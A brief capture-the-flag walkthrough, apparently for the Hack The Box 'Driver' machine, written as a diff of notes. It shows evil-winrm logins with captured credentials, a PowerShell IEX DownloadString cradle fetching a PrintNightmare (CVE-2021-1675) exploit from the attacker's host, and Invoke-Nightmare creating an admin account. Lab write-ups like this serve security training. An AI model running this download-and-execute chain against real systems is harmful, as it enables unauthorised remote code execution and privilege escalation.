@@ -1,0 +1,10 @@
+└─$ evil-winrm -i driver.htb -u tony -p liltony                                                                     
+
+On local machine git clone https://github.com/calebstewart/CVE-2021-1675.git then start a http server
+
+Next, run this on victim machine
+    IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.9/CVE-2021-1675.ps1");
+    Invoke-Nightmare
+
+└─$ evil-winrm -i driver.htb -u adm1n -p P@ssw0rd
+    Then download root.txt & user.txt
